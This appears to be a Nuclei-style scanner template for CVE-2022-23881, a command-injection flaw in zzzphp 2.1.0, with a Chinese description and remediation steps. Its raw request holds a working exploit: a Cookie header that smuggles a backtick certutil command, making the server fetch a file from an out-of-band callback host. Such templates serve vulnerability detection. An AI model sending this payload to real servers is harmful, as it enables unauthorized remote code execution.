id: CVE-2022-23881
info:
  name: ZZZCMS zzzphp 2.1.0 - Remote Code Execution
  author:
  - l0ne1y
  description: |2-
     zzzphp 命令注入漏洞
    zzzphp是一套内容管理系统（CMS）。

    zzzphp v2.1.0 版本存在安全漏洞，该漏洞源于 zzz_template.php 中的 danger_key() 函数对用户传入参数的不完全过滤。
  severity: critical
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    http://www.zzzcms.com/index.html

    临时修复方案：
    1、尽量不去执行外部的应用程序或命令。
    2、使用自定义函数或函数库实现外部应用程序或命令的功能。
    3、过滤用户输入。
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  - type: status
    status:
    - 500
  matchers-condition: and
  raw:
  - |
    GET /?location=search HTTP/1.1
    Host: {{Hostname}}
    Cookies: keys={if:=`certutil -urlcache -split -f https://{{interactsh-url}}/poc`}{end if}
